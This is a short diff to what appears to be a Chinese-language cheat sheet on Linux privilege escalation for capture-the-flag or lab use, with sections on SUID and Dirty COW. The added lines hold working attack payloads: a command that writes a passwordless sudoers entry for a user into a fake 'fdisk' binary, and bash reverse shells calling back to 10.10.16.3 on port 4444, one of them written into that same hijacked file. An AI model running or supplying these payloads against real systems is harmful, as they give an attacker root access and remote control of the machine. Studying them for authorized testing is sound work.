@@ -627,6 +627,12 @@ os.system("/bin/bash")
 
 [CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit)
 
+
+
+## suid-sysinfo
+
+
+
 # 脏牛提权
 
 利用探针脚本检测存在的漏洞
@@ -687,11 +693,15 @@ return 0;
 
 ```
 将用户权限写进/etc/sudoers
-echo "echo 'www-data ALL=(ALL) NOPASSWD:ALL >>/etc/sudoers' " >update
+echo "echo 'theseus ALL=(ALL) NOPASSWD:ALL >>/etc/sudoers' " >fdisk
 ```
 
 ```
 #! /bin/bash
-bash -i &> /dev/tcp/10.10.16.5/4444 0>&1
+bash -i &> /dev/tcp/10.10.16.3/4444 0>&1
+```
+
+```
+echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.16.3/4444 0>&1' > fdisk
 ```
 
